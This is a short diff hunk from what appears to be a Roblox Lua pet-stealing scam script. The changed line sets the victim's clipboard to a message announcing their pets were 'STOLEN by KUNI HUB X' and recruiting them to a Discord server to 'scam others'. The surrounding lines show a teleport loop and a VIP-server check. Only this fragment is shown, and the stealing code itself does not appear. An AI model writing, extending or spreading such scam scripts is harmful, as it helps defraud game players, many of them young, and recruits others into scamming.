@@ -18,7 +18,7 @@ getgenv().Username = "BEESUCALL"
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
+        setclipboard("Your pets have been STOLEN by KUNI HUB X. If you want to scam others join the Discord! https://discord.gg/7E7hzqyX")
 
         
         if GetServerType:InvokeServer() == "VIPServer" then
